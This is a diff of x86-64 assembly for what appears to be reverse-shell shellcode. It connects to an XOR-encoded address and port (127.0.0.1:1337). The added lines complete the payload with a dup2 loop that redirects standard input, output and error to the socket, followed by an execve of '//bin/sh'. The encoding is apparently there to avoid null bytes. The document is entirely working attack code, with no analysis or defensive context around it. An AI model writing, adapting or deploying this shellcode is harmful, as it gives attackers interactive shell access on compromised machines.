@@ -17,32 +17,38 @@ mov		rdi,rax
 xor		rax,rax
 push		rax
 push		rax
-push            0x1011116E	; XOR-encoded -> 127.0.0.1
-xor dword       [rsp],0x11111111
-push word       0x2814          ; push tcp port (XOR-encoded -> 1337)
-xor word        [rsp],0x1111 ; decode tcp port
-push word       0x2    ; 0x2 -> AF_INET
-mov             rsi,rsp
+push dword	0x1011116E	; XOR-encoded -> 127.0.0.1
+xor dword	[rsp],0x11111111
+push word	0x2814          ; push tcp port (XOR-encoded -> 1337)
+xor word	[rsp],0x1111 ; decode tcp port
+push word	0x2    ; 0x2 -> AF_INET
+mov		rsi,rsp
 mov		dl,0x10
 mov		al,42
 syscall
 
 ; dup2()
-;mov		rbx,rdi
-;xor		rdi,rdi
-;xor		rsi,rsi
-;xor             rcx,rcx         ; zero out count register
-;mov             cl,0x3          ; loopcount
-;dupes:
-;xor             eax,eax         ; zero out eax
-;mov             al,33           ; dup2() syscall
-;dec             cl
-;mov		rdi,rcx
-;mov		rsi,rbx
-;syscall
-;inc             cl
-;loop            dupes
+xor		rdx,rdx
+mov		dl,0x3
+dupes:
+mov		rsi,rdx
+dec		rsi
+xor		rax,rax
+mov		al,0x21
+syscall
+dec		dl
+jnz dupes
 
-; exec()
+; exec
+mov		rax,0x68732f6e69622f2f  ; string 'hs/nib//'
+push		rax
+xor		rax,rax
+mov byte	[rsp + 8],al
+mov		rdi,rsp
+push		rax
+mov		rsi,rsp
+push		rax
+mov		rdx,rsp
+mov		al,0x3b
+syscall
 
-; exit()
